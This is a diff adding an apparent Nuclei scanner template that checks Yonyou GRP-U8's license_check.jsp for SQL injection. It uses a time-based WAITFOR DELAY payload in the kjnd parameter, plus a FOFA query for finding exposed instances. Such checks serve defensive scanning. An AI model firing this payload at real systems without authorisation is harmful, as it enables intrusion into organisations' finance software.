@@ -1,0 +1,27 @@
+id: GRPU8_license_check_sqli
+info:
+  name: 用友GRP-U8 license_check.jsp sql注入漏洞
+  author: mike
+  severity: info
+  description: xxx
+  metadata:
+    max-request: 1
+    verified: true
+    fofa-query: app="用友-GRP-U8"
+http:
+  - raw:
+      - |
+        GET /u8qx/license_check.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:6%27-- HTTP/1.1
+        Host: {{Hostname}}
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36
+        Connection: close
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
+      - type: dsl
+        dsl:
+          - 'duration>=6'
